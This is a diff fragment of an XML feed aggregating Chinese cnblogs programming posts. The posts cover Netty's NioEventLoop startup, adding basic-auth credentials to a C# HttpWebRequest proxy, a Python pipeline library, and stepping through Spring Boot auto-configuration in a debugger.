+                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
+            }
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;与NioEventLoop绑定&lt;/span&gt;
+            AbstractChannel.&lt;span&gt;this&lt;/span&gt;.eventLoop =&lt;span&gt; eventLoop;
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;首先判断线程是否一致,当前线程是NioServerSocketChannel的线程,与当前创建NioSocketChannel的eventLoop线程不一致&lt;/span&gt;
+            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (eventLoop.inEventLoop()) {
+                register0(promise);
+            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
+                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在这里NioEventLoop启动&lt;/span&gt;
+                    eventLoop.execute(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
+                        @Override
+                        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
+                            register0(promise);
+                        }
+                    });
+                } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
+                    logger.warn(
+                            &lt;/span&gt;&quot;Force-closing a channel whose registration task was not accepted by an event loop: {}&quot;&lt;span&gt;,
+                            AbstractChannel.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, t);
+                    closeForcibly();
+                    closeFuture.setClosed();
+                    safeSetFailure(promise, t);
+                }
+            }
+        }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;上面代码中的 eventLoop.execute我们已经分析过，经过一系列的流程，最后会执行NioEventLoop的run方法开始轮询感兴趣的IO事件。&lt;/p&gt;
+&lt;p&gt; 以上我们主要从服务启动与客户端连接两个方面分析了NioEventLoop的启动流程与源码，其实也就对应NioServerSocketChannel与NioSocketChannel分别绑定的NioEventLoop，其中有错误和不足之处还请指正与海涵。&lt;/p&gt;
+</description>
+<pubDate>Sat, 23 Mar 2019 07:13:00 +0000</pubDate>
+<dc:creator>bigfan</dc:creator>
+<og:description>上篇文章中我们对Netty中NioEventLoop创建流程与源码进行了跟踪分析。本篇文章中我们接着分析NioEventLoop的启动流程； Netty中会在服务端启动和新连接接入时通过chooser</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/dafanjoy/p/10507393.html</dc:identifier>
+</item>
+<item>
+<title>C# 使用 Proxy 代理请求资源 - BUTTERAPPLE</title>
+<link>http://www.cnblogs.com/xiyin/p/10583787.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/xiyin/p/10583787.html</guid>
+<description>&lt;h2 id=&quot;c-使用-proxy-请求资源基于-httpwebrequest-类&quot;&gt;C# 使用 Proxy 请求资源，基于 HttpWebRequest 类&lt;/h2&gt;
+&lt;h4 id=&quot;前言&quot;&gt;前言&lt;/h4&gt;
+&lt;p&gt;这是上周在开发 C# 中使用 &lt;code&gt;Proxy&lt;/code&gt; 代理时开发的一些思考和实践。主要需求是这样的，用户可以配置每次请求是否需要代理，用户可以配置 &lt;code&gt;HTTP&lt;/code&gt;代理，&lt;code&gt;HTTPS&lt;/code&gt;代理和代理白名单。&lt;/p&gt;
+&lt;h4 id=&quot;还是太年轻&quot;&gt;还是太年轻&lt;/h4&gt;
+&lt;p&gt;因为一直用的C# 网络库中的&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest?view=netframework-4.7.2&quot;&gt;HttpWebRequest&lt;/a&gt;，所以自然而然先去找找看这个网络库有没有封装好我所需要的代理呀。果不其然，被我找到了。自从上次发现某些类对老版本不兼容后，每次在微软官方文档上找到都会翻到最后，查看一下支持的最低框架。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/69a9dfdbgy1g1cjoouex9j20oj01fa9z.jpg&quot;/&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我需要的就是这个 &lt;code&gt;Proxy&lt;/code&gt; 属性，也就是说我最终在发送请求前，设置好这个 &lt;code&gt;Proxy&lt;/code&gt; 属性就可以了。先去看看 &lt;code&gt;Proxy&lt;/code&gt; 类&lt;/p&gt;
+&lt;blockquote readability=&quot;5.1509433962264&quot;&gt;
+&lt;p&gt;The &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.iwebproxy?view=netframework-4.7.2&quot;&gt;IWebProxy&lt;/a&gt; object to use to proxy the request. The default value is set by calling the &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.net.globalproxyselection.select?view=netframework-4.7.2#System_Net_GlobalProxySelection_Select&quot;&gt;Select&lt;/a&gt; property.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这样的意思就是说我只要构造一个&lt;code&gt;WebProxy&lt;/code&gt;，然后赋值给 &lt;code&gt;HttpWebRequest.Proxy&lt;/code&gt;就可以了。&lt;/p&gt;
+&lt;p&gt;看到了&lt;code&gt;WebProxy&lt;/code&gt; 的构造器，马上锁定了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/69a9dfdbgy1g1ckczx1v9j20om0jeq6l.jpg&quot;/&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;因为我需要用户传的是 &lt;code&gt;string&lt;/code&gt; ，所以直接这样构造就可以了。然后就是测试了，主管大佬写的 &lt;code&gt;Node.js&lt;/code&gt;的&lt;code&gt;Proxy&lt;/code&gt;代理 &lt;a href=&quot;https://www.npmjs.com/package/o_o&quot;&gt;o_o&lt;/a&gt; 先来测试测试&lt;/p&gt;
+&lt;pre class=&quot;bash&quot;&gt;
+&lt;code&gt;npm install o_o -g
+
+o_o&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;这样就启动全局安装并启动了代理，在控制台上可以看到监听的是 8989 端口&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/69a9dfdbgy1g1ckirav4kj208v04e3yn.jpg&quot;/&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt; [Fact]
+public void HttpProxy()
+{
+    var request = new DescribeAccessPointsRequest();
+    client.SetHttpProxy(&quot;http://localhost:8989&quot;);
+
+    var response = client.GetAcsResponse(request);
+    Assert.NotNull(response.HttpResponse.Content);
+
+    var expectValue = &quot;HTTP/1.1 o_o&quot;;
+    string actualValue;
+    response.HttpResponse.Headers.TryGetValue(&quot;Via&quot;, out actualValue);
+    Assert.Equal(expectValue, actualValue);
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;如果经过了代理，头部会出现 &lt;code&gt;&quot;HTTP/1.1 o_o&quot;&lt;/code&gt; 字段 ，经过&lt;code&gt;FT&lt;/code&gt;测试，是成功的。&lt;/p&gt;
+&lt;p&gt;本来一切都没有问题的，除了我自己想的比较简单外，直到我 Code Review 了一下组里开发JAVA 的人实现这个功能的 Pull Request ，我才发现我还真的是想的太简单！！！&lt;/p&gt;
+&lt;h4 id=&quot;开始重构&quot;&gt;开始重构&lt;/h4&gt;
+&lt;p&gt;首先发现的一点是，我连&lt;code&gt;Constructor&lt;/code&gt;都用错了，用&lt;code&gt;ILSpy&lt;/code&gt;反编译了一下，发现&lt;code&gt;WebProxy(string,bool,string[])&lt;/code&gt;所作的事。&lt;img src=&quot;http://ww1.sinaimg.cn/large/69a9dfdbgy1g1cnpas4hrj20qx027wef.jpg&quot;/&gt;&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;// System.Net.WebProxy
+private static Uri CreateProxyUri(string address)
+{
+    if (address == null)
+    {
+        return null;
+    }
+    if (address.IndexOf(&quot;://&quot;) == -1)
+    {
+        address = &quot;http://&quot; + address;
+    }
+    return new Uri(address);
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;即使传进去的是string，最后也是构造成 &lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/system.uri?view=netframework-4.7.2&quot;&gt;Uri&lt;/a&gt;， 为什么会关注的这个呢？因为我发现有些Proxy地址是&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://username:password@localhost:8989&lt;/code&gt; 长这样的，那么我如果直接以这种形式传入到&lt;code&gt;CreateProxy&lt;/code&gt;里面，它会自动给我分解，然后分&lt;code&gt;Credential&lt;/code&gt;和 &lt;code&gt;proxy&lt;/code&gt; 传入到网络库中吗？接下来就是验证的过程。&lt;/p&gt;
+&lt;p&gt;首先需要了解到的一个概念：&lt;strong&gt;Basic access authentication&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote readability=&quot;12.371364653244&quot;&gt;
+&lt;p&gt;In the context of an &lt;a href=&quot;https://en.wikipedia.org/wiki/HTTP&quot;&gt;HTTP&lt;/a&gt; transaction, &lt;strong&gt;basic access authentication&lt;/strong&gt; is a method for an &lt;a href=&quot;https://en.wikipedia.org/wiki/User_agent&quot;&gt;HTTP user agent&lt;/a&gt; (e.g. a web browser) to provide a &lt;a href=&quot;https://en.wikipedia.org/wiki/User_name&quot;&gt;user name&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Password&quot;&gt;password&lt;/a&gt; when making a request. In basic HTTP authentication, a request contains a header field of the form &lt;code&gt;Authorization: Basic &amp;lt;credentials&amp;gt;&lt;/code&gt;, where credentials is the base64 encoding of id and password joined by a colon.&lt;/p&gt;
+&lt;p&gt;It is specified in &lt;a href=&quot;https://tools.ietf.org/html/rfc7617&quot;&gt;RFC 7617&lt;/a&gt; from 2015, which obsoletes &lt;a href=&quot;https://tools.ietf.org/html/rfc2617&quot;&gt;RFC 2617&lt;/a&gt; from 1999.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;由于其不安全性，已在 RFC 中弃用了，转而代之的是 TLS SSL 那些协议。&lt;/p&gt;
+&lt;p&gt;问题来了， &lt;code&gt;HttpWebRequest&lt;/code&gt; 中支持&lt;code&gt;Basic Authentication&lt;/code&gt;吗？我们可以看到&lt;code&gt;WebProxy&lt;/code&gt;中有一个构造方法最后一个参数是 ICredential 的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/69a9dfdbgy1g1co0t6go6j20qe03dgm7.jpg&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;是的，就是它，知道前因后果和不足后，我继续去重构 &lt;code&gt;Http Proxy&lt;/code&gt; 的代码：&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;originProxyUri = new Uri(proxy);
+if (!String.IsNullOrEmpty(originProxyUri.UserInfo))
+{
+    authorization = Convert.ToBase64String(System.Text.Encoding.GetEncoding(&quot;ISO-8859-1&quot;).GetBytes(originProxyUri.UserInfo));
+    finalProxyUri = new Uri(originProxyUri.Scheme + &quot;://&quot; + originProxyUri.Authority);
+    var userInfoArray = originProxyUri.UserInfo.Split(':');
+    credential = new NetworkCredential(userInfoArray[0], userInfoArray[1]);
+
+    httpRequest.WebProxy = new WebProxy(finalProxyUri, false, noProxy, credential);
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;先拆分出 &lt;code&gt;UserInfo Credential&lt;/code&gt; 和 &lt;code&gt;Uri&lt;/code&gt;信息，然后分别重新构造相应的类型传入到 &lt;code&gt;WebProxy&lt;/code&gt; 中。上面也有一个坑，我之前还想用正则把&lt;code&gt;username&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt; 分别提取出去了，没想到 Uri 已经封装好了，直接取里面的&lt;code&gt;userinfo&lt;/code&gt; 信息。哈哈，省力了。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;StackOverFlow&lt;/code&gt;上也有挺多关于如何传入 &lt;code&gt;Credential&lt;/code&gt; 到&lt;code&gt;Proxy&lt;/code&gt;中，基本上用的也是这个方法，按理说这样就完事了，直到我做了测试，我发现微软这个&lt;code&gt;Credential&lt;/code&gt;根本没有起作用，如果是正确的话，会在 &lt;code&gt;HEADER&lt;/code&gt; 中添加&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Authorization: Basic &amp;lt;credentials&amp;gt;&lt;/code&gt; ，和上面那段测试代码一样，&lt;/p&gt;
+&lt;pre class=&quot;csharp&quot;&gt;
+&lt;code&gt;[Fact]
+public void HttpProxyWithCredential()
+{
+    DescribeAccessPointsRequest request = new DescribeAccessPointsRequest();
+    client.SetHttpProxy(&quot;http://username:password@localhost:8989&quot;);
+    var response = client.GetAcsResponse(request);
+
+    var expectValue = &quot;HTTP/1.1 o_o&quot;;
+    string actualValue;
+    response.HttpResponse.Headers.TryGetValue(&quot;Via&quot;, out actualValue);
+
+    Assert.Equal(expectValue, actualValue);
+    Assert.NotNull(response.HttpResponse.Content);
+}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;我去测试了发现，这个头部里面根本没有加这个 &lt;code&gt;Authorization&lt;/code&gt; 属性啊，尴尬了，是官方文档坑还是我使用不正确呢，基于此，想到了之前 主管 开发的那个 &lt;code&gt;Proxy&lt;/code&gt; 代理 &lt;code&gt;o_o&lt;/code&gt; ，我又去找了一个验证 &lt;code&gt;basic-auth&lt;/code&gt; 的&lt;code&gt;node.js&lt;/code&gt; 代理服务器 &lt;a href=&quot;https://github.com/jshttp/basic-auth#readme&quot;&gt;basic-auth&lt;/a&gt;&lt;/p&gt;
+&lt;pre class=&quot;bash&quot;&gt;
+&lt;code&gt;npm install basic-auth&lt;/code&gt;
+&lt;/pre&gt;
+&lt;pre class=&quot;js&quot;&gt;
+&lt;code&gt;var http = require('http')
+var auth = require('basic-auth')
+var compare = require('tsscmp')
+
+// Create server
+var server = http.createServer(function (req, res) {
+  var credentials = auth(req)
+
+  // Check credentials
+  // The &quot;check&quot; function will typically be against your user store
+  if (!credentials || !check(credentials.name, credentials.pass)) {
+    res.statusCode = 401
+    res.setHeader('WWW-Authenticate', 'Basic realm=&quot;example&quot;')
+    res.end('Access denied')
+  } else {
+    res.end('Access granted')
+  }
+})
+
+// Basic function to validate credentials for example
+function check (name, pass) {
+  var valid = true
+
+  // Simple method to prevent short-circut and use timing-safe compare
+  valid = compare(name, 'john') &amp;amp;&amp;amp; valid
+  valid = compare(pass, 'secret') &amp;amp;&amp;amp; valid
+
+  return valid
+}
+
+// Listen
+server.listen(3000)&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;将上面那段 Js代码打包成一个 js文件，然后执行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;node tets.js&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;该代理服务器监听 3000端口，我使用刚才那段代码，果不其然，返回的是 401 ，这不是坑吗，官方文档上这样说可以，然而都不行。&lt;/p&gt;
+&lt;p&gt;最后只能强制加上这个 &lt;code&gt;Authorization&lt;/code&gt; 代码&lt;/p&gt;
+&lt;pre class=&quot;c#&quot;&gt;
+&lt;code&gt;originProxyUri = new Uri(proxy);
+if (!String.IsNullOrEmpty(originProxyUri.UserInfo))
+{
+    authorization = Convert.ToBase64String(System.Text.Encoding.GetEncoding(&quot;ISO-8859-1&quot;).GetBytes(originProxyUri.UserInfo));
+    finalProxyUri = new Uri(originProxyUri.Scheme + &quot;://&quot; + originProxyUri.Authority);
+    var userInfoArray = originProxyUri.UserInfo.Split(':');
+    credential = new NetworkCredential(userInfoArray[0], userInfoArray[1]);
+
+    httpRequest.WebProxy = new WebProxy(finalProxyUri, false, noProxy, credential);
+    httpRequest.Headers.Add(&quot;Authorization&quot;, &quot;Basic &quot; + authorization);                    
+}
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;最后在测试经过 3000 端口的代理服务器，确认是没问题的，把问题想得简单的结果就是发了一个新版本后，还没有下载，然而已经发了新版本说，用户您好，我们又有新版本了。尴尬。需要以此为鉴啊。&lt;/p&gt;
+&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;
+&lt;p&gt;姜还是老的辣，多看看别人的代码，来发现自己的不足。勤加练习！&lt;/p&gt;
+</description>
+<pubDate>Sat, 23 Mar 2019 06:10:00 +0000</pubDate>
+<dc:creator>BUTTERAPPLE</dc:creator>
+<og:description>C 使用 Proxy 请求资源，基于 HttpWebRequest 类 前言 这是上周在开发 C 中使用 代理时开发的一些思考和实践。主要需求是这样的，用户可以配置每次请求是否需要代理，用户可以配置</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/xiyin/p/10583787.html</dc:identifier>
+</item>
+<item>
+<title>Easy Pipeline，一种轻量级的Python Pipeline库 - 喵耳朵</title>
+<link>http://www.cnblogs.com/idiotgroup/p/10583779.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/idiotgroup/p/10583779.html</guid>
+<description>&lt;p&gt;嗯，很久没有写博客了，最近的工作都是偏开发性质的，以至于没有时间对自己感兴趣的领域进行探索，感觉个人的成长停滞了一些。如何在枯燥的工作中，提取出有助于自己成长的养分，对于每个人来说都是不小的考验。&lt;/p&gt;
+&lt;p&gt;这次，带来的是之前编写的一下挺简单的库，用来简化流水线作业的小框架。&lt;/p&gt;
+&lt;p&gt;Github: &lt;a href=&quot;https://github.com/miaoerduo/easy-pipeline&quot;&gt;https://github.com/miaoerduo/easy-pipeline&lt;/a&gt; 欢迎Star和提交MR。&lt;/p&gt;
+&lt;p&gt;起因是这样的，组内有一个需求，需要挖掘视频中的检测难样本，这样可以极大地减少标注的量，从而降低成本。难样本挖掘的策略，简单来说就是如果视频的前几帧和后几帧都能检测到目标，而就只有当前帧没有检测到，就说明当前帧很可能存在漏检（没有检测本到该检测到的目标）；反之，如果前后都没有检测到目标，而当前帧检测到了，那就很可能是误检（检测到不是目标的东西）。&lt;/p&gt;
+&lt;p&gt;&lt;img class=&quot;wp-image-1148&quot; src=&quot;https://www.miaoerduo.com/wp-content/uploads/2019/03/image.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;初步的方案是这样的，我们先把视频抽帧，直接用FFMpeg就可以方便的完成。然后调用现在的检测器，进行逐帧的检测，把检测结果存下来。最后写个脚本，分析检测的结果，然后输出可能有问题的帧，然后这些帧就会进行送标（发给标注员进行标注）。最终我们就只需要标注一些比较hard的样本就行了。&lt;/p&gt;
+&lt;p&gt;但是这样会带来很多的问题，最显著的两个：1. 需要保存大量的中间结果（图片帧）；2. 必须依次完成每一步之后，才能得到最终的结果。&lt;/p&gt;
+&lt;p&gt;这时候，相比大家都知道了该如何去解决。对的，我们应该用流水线作业的方式去进行。&lt;/p&gt;
+&lt;p&gt;&lt;img class=&quot;wp-image-1150&quot; src=&quot;https://www.miaoerduo.com/wp-content/uploads/2019/03/image-1.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;首先我们可以将每部分任务并行的去处理。抽帧之后的结果送入队列；之后检测模块从队列取帧，检测之后将结果送入下一个队列；最后一个队列得到检测结果，再做最终的分析。相比于之前的方式，这样可以尽量的减少中间的结果。&lt;/p&gt;
+&lt;p&gt;实现该方案，只需要使用最简单的生产者消费者队列即可以完成。所以说，相信大家都十分了解了。对于上面的逻辑，我们需要的队列的数目和我们的模块数是正相关的。如果单纯的进行实现的话，实在的太麻烦了，给队列命名都要我们绞尽脑汁了。所以，为了更优雅的编写代码，这里就推出本文标题中的Easy Pipeline框架。&lt;/p&gt;
+&lt;p&gt;首先，我们举个最简单的例子来说明该框架的工作模式。输入一个数字的序列，按要求对他们进行加减乘除的操作（这里的每个操作，其实可以等价于前面的抽帧或是检测的更复杂的操作 ），并且支持每个操作的进程数。&lt;/p&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;
+&lt;code&gt;from easy_pipeline import SimplePipeline, PipelineItem, Task, StopTask, EmptyTask
+import multiprocessing as mp
+
+# define our Task
+class NumTask(Task):
+    def __init__(self, x):
+        super(NumTask, self).__init__()
+        self.val = x
+
+# init function, here we use closure to get different function
+def get_init_fn(x):
+    def init():
+        return x
+    return init
+
+# operations
+def plus(res, task):
+    return NumTask(task.val + res)
+
+def mul(res, task):
+    return NumTask(task.val * res)
+
+def minus(res, task):
+    return NumTask(task.val - res)
+
+def div(res, task):
+    return NumTask(task.val / res)
+
+if __name__ == '__main__':
+
+    # job queue
+    manager = mp.Manager()
+    job_queue = manager.Queue(1000)
+
+    # define pipeline and start
+
+    # x = （(x + 1) * 2 - 3）/ 5
+    pipeline_items = [
+        PipelineItem(plus, get_init_fn(1), 1, 10),      # plus 1
+        PipelineItem(mul, get_init_fn(2), 2, 10),       # mul 2
+        PipelineItem(minus, get_init_fn(3), 3, 10),     # minus 3
+        PipelineItem(div, get_init_fn(5.), 4, 10),      # div 5
+    ]
+
+    pipeline = SimplePipeline(pipeline_items, job_queue)
+    pipeline.start()
+    result_queue = pipeline.get_result_queue()
+
+    # Feed jobs anytime (before StopTask)
+    for i in range(10):
+        job_queue.put(NumTask(i))
+
+    # get partial output
+    print('Get Output Start')
+    for i in range(5):
+        result = result_queue.get()
+        if isinstance(result, StopTask):
+            print(&quot;get stop task&quot;)
+            break
+        if isinstance(result, EmptyTask):
+            continue
+        print(result.val)
+    print('Get Output End')
+    
+    # Feed jobs anytime (before StopTask)
+    for i in range(10, 20):
+        job_queue.put(NumTask(i))
+
+    # Stop pipeline, means no more job will be added then.
+    # Every process will exit when it has done all current jobs in job_queue
+    pipeline.stop()
+
+    # get all output
+    print('Get Output Start')
+    while True:
+        result = result_queue.get()
+        if isinstance(result, StopTask):
+            print(&quot;Output Queue Empty&quot;)
+            break
+        if isinstance(result, EmptyTask):
+            continue
+        print(result.val)
+    print('Get Output End')&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;下面，我们来简单的说明一下工作逻辑。&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;&lt;strong&gt;首先，我们需要定义自己的任务Task。&lt;/strong&gt;只需要继承Task这个类即可，内部可以存放自己喜欢的任何数据。这里只是为了计算，所以就只存放了一个数字。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;定义我们的初始化函数和工作函数。&lt;/strong&gt;初始化函数的作用是给每个进程初始化一些资源，如果不需要也可以不要。这里的初始化函数就是返回了一个值，表示操作数。工作函数是最重要的函数，他会处理接收到的Task，处理并返回新的Task（新的Task可以理解为处理的结果）。工作函数有两个输入，一个是资源，即初始化函数的返回值，另一个就是Task本身。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;构建Pipeline。&lt;/strong&gt;每个工作模块都只需要用PipelineItem这个对象进行封装即可。器参数分别是：工作函数、初始化函数、进程数、结果队列的长度（-1表示不限长度）。结果队列的长度，通常设置为较大的值即可。因为不能的模块的处理速度可能不同，因此很容易出现结果堆积的现象，如果不支持队列长度，会导致内存的大量的占用。最后将PipelineItem的数组和输入的对垒传给SimplePipeline对象即可构建完我们的整套Pipeline程序了！&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;启动Pipeline程序，并输入数据。&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;得到结果！&lt;/strong&gt;完事了，优秀。&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;上面这是一个最简单的例子，可以比较直观的感受到这个框架的便捷之处。完全屏蔽掉对队列，并发等的操作。&lt;/p&gt;
+&lt;p&gt;在我推荐给同事之后，确实一定程度地减小他的工作量，但同时，他也向我反馈了一些问题：这个框架在某些地方有些比较灵活的设计，应该给出足够多的实例，才能方便实用。关于该框架的设计思路和实例，将会在下一篇博客中进行详细介绍。&lt;/p&gt;
+&lt;p&gt;最后，欢迎大家Star和提交MR。愿与你们一同进步。&lt;/p&gt;
+</description>
+<pubDate>Sat, 23 Mar 2019 06:09:00 +0000</pubDate>
+<dc:creator>喵耳朵</dc:creator>
+<og:description>本文主要是分析遇到的项目中的问题，抽象成流水线的工作流程，最后安利一个自己开发的小框架。</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/idiotgroup/p/10583779.html</dc:identifier>
+</item>
+<item>
+<title>SpringBoot自动配置源码调试 - STM32STM32STM32</title>
+<link>http://www.cnblogs.com/stm32stm32/p/10575145.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/stm32stm32/p/10575145.html</guid>
+<description>&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;之前对SpringBoot的自动配置原理进行了较为详细的介绍（&lt;a href=&quot;https://www.cnblogs.com/stm32stm32/p/10560933.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/stm32stm32/p/10560933.html&lt;/a&gt;），接下来就对自动配置进行源码调试，探究下这个配置过程中各参数的情况。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;strong&gt;&lt;span&gt;这里对AutoConfigurationImportSelector类的selectImports()方法打了4处断点，将着重对这4处进行调试。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190321221652148-900509833.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;第一处断点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092049435-398512848.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;该方法的源码如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190321221930111-1894793121.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt; &lt;strong&gt;这一步就是将META-INF/spring-autoconfigure-metadata.properties文件中的键值对放入AutoConfigurationMetadataLoader的内部类PropertiesAutoConfigurationMetadata的Properties对象中，共有485个元素。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092403182-586048121.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;第二处断点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092441222-967125976.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;这个方法的源码如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092631870-1966997301.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;其中的name就是org.springframework.boot.autoconfigure.EnableAutoConfiguration类：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092718746-317596358.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;下面的方法中的metadata.getAnnotationAttributes(name, true)获取到的值如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092819785-351745953.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323092914327-1759807905.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;这里还利用断言进行attributes是否为null判断，若为null，则提示No auto-configuration attributes found. Is com.SpringboothuifuApplication annotated with EnableAutoConfiguration ？&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093014420-907448733.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;最终得到的attributes为：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093127524-1015212449.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;第三处断点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093219070-852412072.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;getCandidateConfigurations方法定义如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093333863-65258421.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;其中的getSpringFactoriesLoaderFactoryClass()返回的是EnableAutoConfiguration.class。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093421770-233739253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;进入loadFacotryNames()方法进行调试：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/864087/201903/864087-20190323093532929-912238932.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;factoryClassName的值为org.springframework.boot.autoconfigure.EnableAutoConfiguration。&lt;/p&gt;
